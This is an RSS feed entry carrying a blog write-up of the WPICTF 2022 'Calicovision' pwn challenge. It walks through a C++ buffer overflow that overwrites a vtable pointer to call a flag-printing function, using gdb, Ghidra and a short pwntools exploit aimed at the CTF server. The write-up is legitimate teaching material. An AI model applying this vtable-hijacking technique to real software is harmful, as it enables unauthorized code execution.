<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Pwn on Dorian B.</title><link>https://dorianb.net/blog/tags/pwn/</link><description>Recent content in Pwn on Dorian B.</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 05 Nov 2022 10:00:00 +0200</lastBuildDate><atom:link href="https://dorianb.net/blog/tags/pwn/index.xml" rel="self" type="application/rss+xml"/><item><title>WPICTF 2022 - PWN - Calicovision</title><link>https://dorianb.net/blog/wpictf2022-pwn/</link><pubDate>Sat, 05 Nov 2022 10:00:00 +0200</pubDate><guid>https://dorianb.net/blog/wpictf2022-pwn/</guid><description>&lt;img src="https://dorianb.net/blog/wpictf2022-pwn/gdb_overflow.png" alt="Featured image of post WPICTF 2022 - PWN - Calicovision" />&lt;p class="note">This post was written in 2022, but I had never posted it by accident. Published in October 2024.&lt;/p>
&lt;h1 id="introduction">&lt;a href="#introduction" class="header-anchor">&lt;/a>Introduction
&lt;/h1>&lt;p>To continue our previous post about the WPICTF 2022 (online, hosted by &lt;a class="link" href="https://wpictf.xyz/" target="_blank" rel="noopener"
>Worcester Polytechnic Institute Cyber Security Club&lt;/a>), we will focus our attention on a pwn challenge. And to change, this time we&amp;rsquo;ll use &lt;a class="link" href="https://ghidra-sre.org/" target="_blank" rel="noopener"
>Ghidra&lt;/a> rather than &lt;a class="link" href="https://cutter.re/" target="_blank" rel="noopener"
>Cutter&lt;/a> ðŸ˜Ž&lt;/p>
&lt;p>A x64 ELF binary is provided with this challenge, no code is given.&lt;/p>
&lt;h2 id="recon">&lt;a href="#recon" class="header-anchor">&lt;/a>Recon
&lt;/h2>&lt;p>We explore the terminal user interface (TUI) of the binary, and we find the potential buffer overflow in the &lt;code>B - Name a cat&lt;/code> submenu. Let&amp;rsquo;s try to get the offset with &lt;a class="link" href="https://github.com/longld/peda" target="_blank" rel="noopener"
>gdb-peda&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">$ pattern create &lt;span class="m">100&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ r
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">B
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>paste pattern&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">A
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[=&lt;/span>&amp;gt; overflow &lt;span class="o">(&lt;/span>no RIP erase&lt;span class="o">)]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ pattern_search
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[=&lt;/span>&amp;gt; overflow &lt;span class="o">(&lt;/span>RAX erase and RIP pointing to call &lt;span class="o">[&lt;/span>RAX&lt;span class="o">])]]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>As we can see, it will not be that trivial to exploit the vulnerability since &lt;code>RIP&lt;/code> is not directly controlled. However, we can see that &lt;code>RIP&lt;/code> will point to a &lt;code>call&lt;/code> instruction, with the function address stored in &lt;code>RAX&lt;/code>, and &lt;code>RAX&lt;/code> retrieve this function adress from the value pointed by &lt;code>R12&lt;/code>:&lt;/p>
&lt;p>&lt;img src="https://dorianb.net/blog/blog/wpictf2022-pwn/gdb.png"
width="710"
height="393"
loading="lazy"
alt="GDB-peda view of the overflow"
class="gallery-image"
data-flex-grow="180"
data-flex-basis="433px"
>&lt;/p>
&lt;p>So, to summarize:&lt;/p>
&lt;ul>
&lt;li>We can change what is pointed by &lt;code>R12&lt;/code> with the overflow,&lt;/li>
&lt;li>This will change the value of &lt;code>RAX&lt;/code>,&lt;/li>
&lt;li>&lt;code>RAX&lt;/code> is then used as a function pointer in a &lt;code>call&lt;/code>,&lt;/li>
&lt;/ul>
&lt;p>We can translate in pseudo-code what is happening &lt;code>call *(*(R12))&lt;/code>, or simpler:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-r" data-lang="r">&lt;span class="line">&lt;span class="cl">&lt;span class="n">R12&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">overflow[&lt;/span>&lt;span class="o">??&lt;/span>&lt;span class="n">]&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">call&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">R12&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">call&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">overflow[&lt;/span>&lt;span class="o">??&lt;/span>&lt;span class="n">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Then, we can control the flow and if we change what is pointed by &lt;code>R12&lt;/code> to a pointer to a vulnerable code, we win.&lt;/p>
&lt;p>Without reversing we already have a lot of information, but to validate our hypothesis we will have to open &lt;a class="link" href="https://ghidra-sre.org/" target="_blank" rel="noopener"
>Ghidra&lt;/a>. We quickly find that the code is in C++ (good news) and therefore there is a lot of garbage code. We start to focus on the &lt;code>Cat&lt;/code> structure (we can make the hypothesis that it&amp;rsquo;s a class) and find some interesting information using the structure editor of Ghidra:&lt;/p>
&lt;p>&lt;img src="https://dorianb.net/blog/blog/wpictf2022-pwn/ghidra_cat.png"
width="1920"
height="853"
loading="lazy"
alt="Reverse of the Cat structure"
class="gallery-image"
data-flex-grow="225"
data-flex-basis="540px"
>&lt;/p>
&lt;p>As we can see, the &lt;code>Cat&lt;/code> class is composed of a &lt;code>name&lt;/code> field of 64 bytes (where the overflow is happening) and a super interesting function pointer &lt;code>vptr_Cat&lt;/code>. We know that this a sign of a &lt;code>vtable&lt;/code> and confirm that &lt;code>Cat&lt;/code> is a class, that surely deal with inheritance.&lt;/p>
&lt;p>As a reminder of what a &lt;code>vtable&lt;/code> is, let&amp;rsquo;s read a bit of &lt;a class="link" href="https://en.wikipedia.org/wiki/Virtual_method_table" target="_blank" rel="noopener"
>Wikipedia&lt;/a>:&lt;/p>
&lt;blockquote>
&lt;p>In computer programming, a virtual method table (VMT), virtual function table, virtual call table, dispatch table, vtable, or vftable is a mechanism used in a programming language to support dynamic dispatch (or run-time method binding). Whenever a class defines a virtual function (or method), most compilers add a hidden member variable to the class that points to an array of pointers to (virtual) functions called the virtual method table. These pointers are used at runtime to invoke the appropriate function implementations, because at compile time it may not yet be known if the base function is to be called or a derived one implemented by a class that inherits from the base class.&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>Typically, the compiler creates a separate virtual method table for each class. When an object is created, a pointer to this table, called the virtual table pointer, vpointer or VPTR, is added as a hidden member of this object. As such, the compiler must also generate &amp;ldquo;hidden&amp;rdquo; code in the constructors of each class to initialize a new object&amp;rsquo;s virtual table pointer to the address of its class&amp;rsquo;s virtual method table.&lt;/p>
&lt;/blockquote>
&lt;p>Since everything is better explained with a diagram, here is one:&lt;/p>
&lt;p>&lt;img src="https://www.learncpp.com/images/CppTutorial/Section12/VTable.gif"
loading="lazy"
>&lt;/p>
&lt;p>If you want to delve deeper into the subject, a good reference is available here: &lt;a class="link" href="http://phrack.org/issues/56/8.html" target="_blank" rel="noopener"
>SMASHING C++ VPTRS&lt;/a>. We can see the &lt;code>vtable&lt;/code> in &lt;code>gdb&lt;/code>:&lt;/p>
&lt;p>&lt;img src="https://dorianb.net/blog/blog/wpictf2022-pwn/gdb_vtable.png"
width="553"
height="113"
loading="lazy"
alt="Vtable view in gdb"
class="gallery-image"
data-flex-grow="489"
data-flex-basis="1174px"
>&lt;/p>
&lt;p>So, we know via &lt;code>gdb&lt;/code> that we need to deal with a function pointer to exploit the buffer overflow, and we just saw that the overflowable &lt;code>Cat&lt;/code> class contains a &lt;code>vptr&lt;/code>. We are close to victory, now we just have to make a choice to exploit the situation:&lt;/p>
&lt;ul>
&lt;li>Place our own &lt;code>vtable&lt;/code> (pointer) in memory and make &lt;code>R12&lt;/code> point to it,&lt;/li>
&lt;li>Use the current &lt;code>vtable&lt;/code>, but call a vulnerable function.&lt;/li>
&lt;/ul>
&lt;p>The second option is the simplest, but we need to dig a bit more to make a definitive choice. So let&amp;rsquo;s check the binary&amp;rsquo;s protections:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">CANARY : ENABLED
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FORTIFY : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NX : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PIE : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RELRO : Partial
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>That&amp;rsquo;s good, we can use both techniques without issue (we don&amp;rsquo;t have to deal with any canaries for this buffer overflow). Now let&amp;rsquo;s find the offset to control &lt;code>R12&lt;/code>:&lt;/p>
&lt;p>&lt;img src="https://dorianb.net/blog/blog/wpictf2022-pwn/gdb_overflow.png"
width="1497"
height="822"
loading="lazy"
alt="GDB view of the R12 overflow and offset"
class="gallery-image"
data-flex-grow="182"
data-flex-basis="437px"
>&lt;/p>
&lt;p>The offset is &lt;code>64 (name) + 8 (padding)&lt;/code> to control what is pointed by &lt;code>R12&lt;/code> and therefore &lt;code>RAX&lt;/code>. We can now search for a vulnerable function in Ghidra by searching for a reference to &lt;code>flag.txt&lt;/code> (CTF classic):&lt;/p>
&lt;p>&lt;img src="https://dorianb.net/blog/blog/wpictf2022-pwn/ghidra_vuln_fn.png"
width="1920"
height="899"
loading="lazy"
alt="Ghidra disassembly of a function containing the flag"
class="gallery-image"
data-flex-grow="213"
data-flex-basis="512px"
>&lt;/p>
&lt;p>Vulnerable function found, in place of the &lt;code>pet&lt;/code> function of the &lt;code>HackerCat&lt;/code> structure. After a bit more digging in &lt;a class="link" href="https://ghidra-sre.org/" target="_blank" rel="noopener"
>Ghidra&lt;/a>, we know that &lt;code>HackerCat&lt;/code> inherit from the &lt;code>Cat&lt;/code> class, and that the function &lt;code>pet&lt;/code> is a virtual function. Therefore, to call this function the binary will use the &lt;code>vtable&lt;/code> of the concerned object.&lt;/p>
&lt;p>To call a virtual function at runtime, the binary will use this format: &lt;code>(*(vtable_addr) + function_offset)()&lt;/code>. After a quick look in Ghidra we can find that the &lt;code>pet&lt;/code> virtual function is not the first in the &lt;code>vtable&lt;/code> (&lt;code>function_offset&lt;/code> is not &lt;code>0&lt;/code>), and therefore a call to this function will have this form:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">vptr = &amp;amp;vtable
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pet_fn_offset = ??
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">call [*(vptr + pet_fn_offset)]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>However, we found that a virtual function is called when doing &lt;code>A - List all cats&lt;/code>, and it&amp;rsquo;s the first in the &lt;code>vtable&lt;/code> (&lt;code>function_offset&lt;/code> is &lt;code>0&lt;/code>). Therefore we end with this layout:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">vptr = &amp;amp;vtable
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">call [*vptr]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So we have again two possibilities:&lt;/p>
&lt;ul>
&lt;li>We can make an exploit using &lt;code>C - Pet a cat&lt;/code> that will call the &lt;code>pet&lt;/code> virtual function. This implies using the &lt;code>vtable&lt;/code> of the &lt;code>HackerCat&lt;/code> class to be able to call the &lt;code>HackerCat::pet&lt;/code> win function.&lt;/li>
&lt;li>We can use &lt;code>A - List all cats&lt;/code> that call another virtual function. This implies replacing a virtual function address with &lt;code>HackerCat::pet&lt;/code>.&lt;/li>
&lt;/ul>
&lt;p>In a diagram this translates to (we find at the top the initial situations, and at the bottom the corresponding exploitation path):&lt;/p>
&lt;p>&lt;img src="https://dorianb.net/blog/blog/wpictf2022-pwn/exploits.png"
width="2602"
height="1612"
loading="lazy"
alt="Possible exploitation paths, one per column"
class="gallery-image"
data-flex-grow="161"
data-flex-basis="387px"
>&lt;/p>
&lt;p>Both options are good, but let&amp;rsquo;s take the second option that is simpler to debug. Let&amp;rsquo;s retrieve the &lt;code>vtable&lt;/code> address of &lt;code>HackerCat&lt;/code> and the address of the pointer to &lt;code>HackerCat::pet&lt;/code> in the same table:&lt;/p>
&lt;p>&lt;img src="https://dorianb.net/blog/blog/wpictf2022-pwn/ghidra_vtable.png"
width="1874"
height="732"
loading="lazy"
alt="Show the vtable of HackerCat in Ghidra"
class="gallery-image"
data-flex-grow="256"
data-flex-basis="614px"
>&lt;/p>
&lt;p>Now, our plan is complete and, since there are no particular protections, we can test everything locally and find the right addresses, then we will just have to replay the same sequence on the online address. The plan is therefore as follows:&lt;/p>
&lt;ul>
&lt;li>We know that we can overwrite the address of the &lt;code>vtable&lt;/code> of &lt;code>Cat&lt;/code> objects.&lt;/li>
&lt;li>We know that pointers to (virtual) functions in this &lt;code>vtable&lt;/code> are called for &lt;code>A - List all cats&lt;/code> and &lt;code>C - Pet a cat&lt;/code> TUI commands.&lt;/li>
&lt;li>We know that the function which will give us the flag is &lt;code>HackerCat::pet&lt;/code>.&lt;/li>
&lt;li>We know that if we replace the &lt;code>vptr&lt;/code> pointer of a &lt;code>Cat&lt;/code> object with the &lt;code>HackerCat::pet&lt;/code> pointer of the &lt;code>vtable&lt;/code> we win.&lt;/li>
&lt;/ul>
&lt;p>So we just have to send an input in the menu &amp;ldquo;B - Name a cat&amp;rdquo; which contains the overflowable input with 72 bytes of garbage and then the address of the pointer to the function &lt;code>HackerCat::pet&lt;/code>, which can be found in the vtable of &lt;code>HackerCat&lt;/code> via &lt;a class="link" href="https://ghidra-sre.org/" target="_blank" rel="noopener"
>Ghidra&lt;/a>. This gives us the following exploit (that is very simple, but we like overthinking here):&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">ctypes&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">LittleEndianStructure&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">gc&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">garbage&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">context&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">arch&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;amd64&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">context&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">endian&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;little&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">r&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;calicovision.wpi-ctf-2022-codelab.kctf.cloud&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1337&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># since we can erase the vtable address, the form of the call will be (*(vtable))()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># so we need to place the address of a pointer to the right function&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># to do that, we can use the vtable of the already existing object we want to use (HackerCat)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Trigger the BOF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">garbage&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">72&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Here we place the address of the vtable pointer to HackerCat::pet =&amp;gt; 0x5b0078.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">function_address&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x5b0078&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">exploit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">garbage&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">function_address&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvlines&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># B - rename cat&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;B&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># New name = exploit&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exploit&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># A - list cats&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">timeout&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">close&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And we get the flag: &lt;code>WPI{c0rrup73d_c475_cr3473_ch405}&lt;/code>.&lt;/p>
&lt;p>In the end, this was very simple, but allowed us to manipulate &lt;code>vtables&lt;/code> and many tools.&lt;/p></description></item></channel></rss>